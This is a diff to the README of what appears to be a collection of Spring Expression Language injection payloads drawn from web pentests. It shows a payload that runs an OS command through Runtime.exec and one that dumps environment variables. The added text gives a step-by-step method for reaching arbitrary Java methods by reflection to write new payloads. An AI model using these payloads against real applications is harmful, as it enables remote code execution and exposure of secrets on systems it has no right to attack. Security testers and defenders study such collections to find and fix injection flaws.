@@ -13,6 +13,28 @@ T(java.lang.Runtime).getRuntime().exec('calc')
 You probably need to start think in another way and try gather and do as much as possible... 
 So, this repository was born from payloads developed during a regular web application pentest and several others written out of boredom, feel free to push more!
 
+### Notes about custom payloads writing:
+1) If you able to use *T(...).method()* - use it
+2) If not - you need to invoke this method by finding it using
+```java
+"".getClass().forName("**package_name_where_method_is_present**").getMethod('methodName',arg1_class,arg2_class, ...)
+```
+3) It's better to get the method using the method described above, but its also possible to use:
+```java
+"".getClass().forName("**package_name_where_method_is_present**").getMethods()[number_of_you_method]
+```
+4) If method is static, first arg for .invoke will be null (or "")
+5) You can find necessery class for method using `"".getClass().forName("arg1_class")`, examples:
+``` java
+"".getClass().forName("java.net.URI") // for java.net.URI
+"".getClass() // for java.net.String
+"".getClass().forName("[B") // for array of java.net.Byte
+```
+also check [Documentation](https://docs.oracle.com/javase/tutorial/reflect/class/classNew.html)
+
+6) pay attention to single and double quotes and change if necessary
+
+
 ## Environment and properties
 ```Java
 T(java.lang.System).getenv().toString()
